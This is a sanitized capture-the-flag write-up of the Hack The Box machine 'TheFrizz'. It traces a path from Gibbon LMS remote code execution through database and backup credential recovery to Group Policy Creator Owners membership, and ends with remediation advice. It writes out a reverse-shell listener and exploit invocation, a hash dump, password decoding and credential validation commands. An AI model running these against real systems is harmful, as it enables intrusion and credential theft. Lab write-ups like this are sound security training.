---
title: "TheFrizz — Gibbon LMS Access and Active Directory Escalation Path"
description: "Gibbon LMS enumeration and database credential recovery lead to a Group Policy Creator Owners path toward Domain Administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - web-security
---

## Summary

This sanitized Hack The Box Windows lab case study follows Gibbon LMS enumeration, documented remote-code-execution access, application-database credential recovery, and Active Directory privilege analysis. Target identifiers, credentials, hashes, and encoded values are represented by distinct placeholders. The notes report a path to Domain Administrator privileges through Group Policy Creator Owners membership; they do not include confirming output for that final escalation.

## Context and Objective

The notes describe an Active Directory domain controller hosting Gibbon LMS. Enumeration identified SSH alongside directory services, while the application footer identified Gibbon v25.0.00. The objective was to assess the available path from exposed web functionality to elevated domain privileges.

## Approach and Evidence

### Service and Application Enumeration

**Observation.** The recorded scan output showed SSH, DNS, Kerberos, LDAP, SMB, and Microsoft RPC services. The notes identify this combination as a domain controller and record Gibbon v25.0.00 in the web application's footer.

**Action.** The notes used a version-detection scan, then mapped the lab hostname locally for web access.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

```text
22/tcp   open  ssh      OpenSSH_for_Windows
88/tcp   open  kerberos Microsoft Windows Kerberos
389/tcp  open  ldap     Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
```

**Technical significance and result.** The service combination establishes an Active Directory context, while application versioning supported investigation of the documented Gibbon vulnerability. The notes report that this identified the web application as the initial access surface.

### Gibbon LMS Remote Code Execution

**Observation.** The recorded footer identified a Gibbon release associated in the notes with CVE-2023-45878.

**Action.** The notes started a listener and invoked an exploit script against the lab host. Unsafe payload details are omitted.

```bash
nc -lvnp <LISTENER_PORT>
python3 <CVE_2023_45878_SCRIPT> -t <TARGET_HOST> -s -i <OPERATOR_IP> -p <LISTENER_PORT>
```

```text
<WEB_APPLICATION_DIRECTORY>
```

**Technical significance and result.** The recorded directory output places the session in the web application context, enabling configuration review. The notes report that the vulnerability yielded a shell on the target.

### Application Database Access and Credential Material

**Observation.** The application configuration contained local database connection settings, and recorded network output showed a local MySQL listener.

**Action.** The notes read the configuration and queried the application database for user records.

```bash
cat config.php
```

```text
$databaseUsername = '<DB_USERNAME>';
$databasePassword = '<DB_PASSWORD>';
$databaseName = 'gibbon';
```

```powershell
.\mysql.exe -u<DB_USERNAME> -p<DB_PASSWORD> gibbon -e 'select * from gibbonperson'
```

```text
<LAB_USER>  <PASSWORD_HASH_WITH_SALT>
```

**Technical significance and result.** Application-level database credentials exposed identity data beyond the web process. The notes report that an offline cracking attempt recovered a password for `<LAB_USER>` and that SMB validation succeeded.

### Authenticated Access and Recycle Bin Review

**Observation.** The notes report that Kerberos-backed SSH access was established for `<LAB_USER>`. A Recycle Bin review then identified two archive files, including a larger WAPT backup archive.

**Action.** The notes extracted the archive and decoded the WAPT configuration value before validating a second account over SMB.

```bash
7z x <WAPT_BACKUP_ARCHIVE>
printf '%s' '<ENCODED_WAPT_PASSWORD>' | base64 -d
nxc smb <TARGET_IP> -u '<WAPT_USER>' -p '<WAPT_USER_PASSWORD>' -k
```

```text
SMB  <TARGET_IP>  445  <TARGET_HOST>  [+] <DOMAIN>\<WAPT_USER>:<WAPT_USER_PASSWORD>
```

**Technical significance and result.** Residual backup data can preserve credentials after deletion. The notes report that the decoded value authenticated as `<WAPT_USER>` and supported subsequent Kerberos-backed SSH access.

### Group Policy Creator Owners Membership

**Observation.** The notes record that `<WAPT_USER>` belonged to Group Policy Creator Owners.

**Action.** The notes inspected group membership after authenticated access.

```powershell
whoami /all
```

```text
<DOMAIN>\Group Policy Creator Owners  Group  <GROUP_SID>  Enabled group
```

**Technical significance and result.** This membership can permit creation and linking of Group Policy Objects, creating an escalation path when delegation is not tightly controlled. The notes report that this group membership provided a path to Domain Administrator privileges; no final privilege-escalation output is recorded.

## Challenges and Decisions

No documented failed attempts, obstacles, or tradeoffs were present in the source notes.

## Outcome

The notes report successful web-shell access, database credential recovery, validation of two distinct accounts, and identification of a privileged Active Directory group membership. The recorded evidence supports an escalation path through Group Policy Creator Owners; it does not establish that Domain Administrator privileges were obtained.

## Lessons and Recommendations

- **Recommendation:** Update Gibbon to a patched release and restrict access to administrative application surfaces.
- **Recommendation:** Remove plaintext database credentials from application configuration and restrict access to configuration files.
- **Recommendation:** Use adaptive password hashing and enforce strong password policies for application accounts.
- **Recommendation:** Securely dispose of backup archives and protect retained backup material with appropriate access controls.
- **Recommendation:** Audit Group Policy Creator Owners membership and constrain delegation to necessary administrative accounts.

The notes present these as remediation recommendations; they do not record remediation testing.

## References

- Hack The Box — [TheFrizz](https://app.hackthebox.com/machines/TheFrizz) machine
- CVE-2023-45878 — Gibbon LMS remote code execution vulnerability
